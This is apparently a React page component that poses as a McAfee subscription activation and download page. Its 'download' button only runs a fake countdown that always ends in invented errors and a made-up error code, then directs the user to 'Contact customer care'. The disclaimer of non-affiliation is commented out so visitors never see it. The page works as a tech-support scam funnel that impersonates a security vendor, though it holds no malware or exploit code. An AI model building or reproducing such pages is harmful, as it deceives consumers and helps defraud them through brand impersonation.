import { useState, useEffect,ReactNode } from "react";
import Navbar from "../component/Navbar";
import Footer from "../component/Footer";

const Demo = () => {
  const [showCountdown, setShowCountdown] = useState(false);
  const [seconds, setSeconds] = useState(10);
const [errorMsg, setErrorMsg] = useState<ReactNode | string>("");

  useEffect(() => {
    let timer: ReturnType<typeof setTimeout>;

    if (showCountdown && seconds > 0) {
      timer = setTimeout(() => setSeconds((prev) => prev - 1), 1000);
    } else if (seconds === 0) {
    setErrorMsg(
  <div className="p-4 bg-red-50 border border-red-200 rounded-lg text-left text-[#5e5b5b]">
  <h1 className="text-xl font-bold text-red-600 mb-2">
    ⚠️Oops! Something went wrong. Contact our support team.
  </h1>
  <ol className="list-decimal list-inside space-y-1 font-medium">
    <li>File not found: The installer may be temporarily unavailable.</li>
    <li>Access denied: You are not authorized to download this file.</li>
    <li>Server error: Please try again later.</li>
    <li>
      Error Code: <span className="font-semibold text-red-500">EBRX16X76D</span>
    </li>
  </ol>
</div>


  
);

      setShowCountdown(false);
    }
    return () => clearTimeout(timer);
  }, [showCountdown, seconds]);

  const handleDownloadClick = () => {
    setShowCountdown(true);
    setSeconds(10);
    setErrorMsg("");
  };

  return (
    <div className="relative min-h-screen w-full">
      <Navbar/>
      <div className="relative z-10 pl-20 bg-white py-4 border-b-4 border-red-500 text-white ">
        <img src="/logo-mca.png" alt="McAfee Logo" className="h-8" />
      </div>

      {/* Background Image */}
      <img
        src="/bg2.png"
        alt="Background"
        className="absolute inset-0 h-screen w-full object-cover z-0"
      />

      {/* Overlay */}
      <div className="absolute inset-0  bg-opacity-40 z-0" />

      {/* Foreground Content */}
      <div className="relative z-10 text-white flex flex-col items-center justify-center min-h-screen pt-20">
        {/* Header */}
        <div className="text-center mb-8">
          <img src="/logo-mca.png" alt="McAfee Logo" className="h-10 mx-auto mb-4" />
          <h2 className="text-3xl font-semibold">Activate Your Subscription</h2>
          <p className="text-sm">Redeem your code and download your security product now.</p>
        </div>

        {/* Main Card */}
        <div className="bg-white text-black shadow-lg rounded-md w-full max-w-4xl text-center py-20 px-12 min-h-[250px] flex flex-col justify-center items-center">
          {!showCountdown && !errorMsg && (
            <button
              onClick={handleDownloadClick}
              className="bg-red-600 hover:bg-red-700 text-white py-3 px-6 rounded-md font-semibold"
            >
              Click To Download Setup
            </button>
          )}

          {showCountdown && (
            <div className="flex flex-col items-center space-y-4">
              <div className="animate-spin rounded-full h-10 w-10 border-t-4 border-red-600 border-solid"></div>
              <p className="text-lg font-medium text-gray-800">
                Preparing your download... {seconds}s
              </p>
            </div>
          )}

         {errorMsg &&<h1 className="text-[red] text-2xl font-bold font-sans ">A technical error was found. Contact customer care if it persists.</h1>
}
          {errorMsg && (
            <p className="text-red-600  text-lg font-semibold mt-4">{errorMsg}</p>
          )}




{errorMsg &&<div className="text-[#524646] pt-10 text-md  font-medium font-sans ">Need help? <span className="border border-red-600 text-red-600 bg-white px-6 py-2 rounded hover:bg-gray-100 font-semibold ">
  <a href="/entercode#userlogin">
    Contact customer care
    </a>
  </span>
  </div>
}

        </div>


        {/* Notice Section */}
        <div className="text-lg text-black mt-6 max-w-4xl text-center px-4">
          <p>
            By clicking <strong>Next</strong>, you accept the{" "}
            <a href="#" className="text-[#c11616] underline">License Agreement</a> and{" "}
            <a href="#" className="text-[#c11616] underline">Privacy Notice</a>.
            You will also receive an email with instructions on downloading your app.
          </p>
        </div>

        {/* Step Indicator */}
        <div className="text-center mt-8 pb-10 text-black">
          <p className="text-lg">Step 2 of 2</p>
          <div className="flex justify-center items-center mt-2">
            <div className="w-6 h-6 rounded-full bg-red-600 text-white text-sm flex items-center justify-center">1</div>
            <div className="w-10 h-1 bg-red-500 mx-2"></div>
            <div className="w-6 h-6 rounded-full bg-red-600 text-white text-sm flex items-center justify-center">2</div>
          </div>
          <p className="mt-2">Already redeemed your code? Download your app from your account.</p>
        <a href="/entercode#userlogin">
           <button className="mt-4 border border-red-600 text-red-600 bg-white px-6 py-2 rounded hover:bg-gray-100 font-semibold">
            Go to My Account
          </button>
          </a> 
        </div>

        {/* Footer */}
        {/* <footer className="mt-16 py-10 text-sm w-full bg-[#121024]  text-gray-300 text-center">
          <div className="space-x-4">
            <span>Customer Support</span>
            <span>Privacy & Legal Terms</span>
          </div>
          <div className="text-red-400 font-bold mt-2">
          <a href="/home">
              <img src="/logo-mca.png" alt="McAfee Logo" className="h-10 mx-auto mb-2" />
            </a>
            Together is power.
          </div>
        </footer> */}
        {/* <footer className=" px-32 py-2 text-sm bg-[#121024] text-gray-300">
          <p>
            Disclaimer: This website operates independently and has no connection to McAfee or its parent companies. This website is an independent resource and is not affiliated with McAfee or Intel Security. All product names, logos, and trademarks are the property of their respective owners.
          </p>
        </footer> */}
        <Footer/>
      </div>
    </div>
  );
};

export default Demo;
